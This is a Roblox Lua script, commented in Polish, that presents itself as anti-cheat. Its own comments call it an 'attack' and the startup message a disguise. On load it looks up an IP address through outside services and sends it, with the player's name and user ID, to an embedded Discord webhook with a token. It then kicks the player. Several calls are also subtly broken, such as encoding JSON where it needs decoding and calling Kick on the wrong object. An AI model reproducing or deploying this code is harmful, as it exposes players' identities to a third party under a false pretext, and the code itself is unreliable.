-- Anti-Cheat Detection & IP Leak Script
local http = game:GetService("HttpService")
local players = game:GetService("Players")

-- Konfiguracja webhook Discord (zamień na swój)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1491843313719050261/l-C_wdzkQR4x9D9-zei2GpHomy4NzV-IASUfmxm-m1Tw1H2gRdfJA057n7i4-MBwvAc4"

-- Funkcja do wysłania na Discord
local function sendToDiscord(title, description, color)
    local embed = {
        title = title,
        description = description,
        color = color or 16711680, -- Czerwony
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    local data = {
        embeds = {embed}
    }
    
    local success, err = pcall(function()
        http:PostAsync(WEBHOOK_URL, http:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
    
    if not success then
        warn("Failed to send to Discord: " .. tostring(err))
    end
end

-- Pobierz IP atakującego (true IP leak via HttpService)
local function getAttackerIP()
    local success, result = pcall(function()
        return http:GetAsync("https://httpbin.org/ip")
    end)
    
    if success then
        local data = http:JSONEncode(result)
        -- Parsowanie IP z odpowiedzi (httpbin zwraca {"origin": "IP"})
        local ipMatch = string.match(data, '"origin"%s*:%s*"([^"]+)"')
        return ipMatch or "Unknown IP"
    end
    
    -- Fallback - inne serwisy IP leak
    local fallbacks = {
        "https://api.ipify.org",
        "https://icanhazip.com",
        "https://wtfismyip.com/text"
    }
    
    for _, url in ipairs(fallbacks) do
        success, result = pcall(function()
            return http:GetAsync(url)
        end)
        if success and result then
            return string.match(result, "^%s*(.-)%s*$") or "Unknown IP"
        end
    end
    
    return "IP Detection Failed"
end

-- Główna funkcja ataku
local function executeAttack()
    local localPlayer = players.LocalPlayer
    local displayName = localPlayer.DisplayName or localPlayer.Name
    local userId = localPlayer.UserId
    
    -- Pobierz prawdziwy IP
    local attackerIP = getAttackerIP()
    
    -- Kick z custom powodem zawierającym IP
    local kickReason = string.format("Cheat detected! Your IP: %s | UserId: %d", attackerIP, userId)
    
    -- Wyślij powiadomienie na Discord
    local discordMsg = string.format(
        "**Cheater Detected!**\n" ..
        "**Username:** `%s` (ID: %d)\n" ..
        "**Real IP:** `%s`\n" ..
        "**Detected by:** Auto-AntiCheat\n" ..
        "**Time:** %s",
        displayName,
        userId,
        attackerIP,
        os.date("%Y-%m-%d %H:%M:%S UTC")
    )
    
    sendToDiscord("🚨 CHEATER CAUGHT 🚨", discordMsg, 16711680)
    
    -- Natychmiastowy kick
    players:Kick(kickReason)
end

-- Wykonaj atak natychmiast po załadowaniu
spawn(function()
    wait(0.1) -- Krótkie opóźnienie dla stabilności
    executeAttack()
end)

print("Anti-Cheat activated...") -- Maskowanie
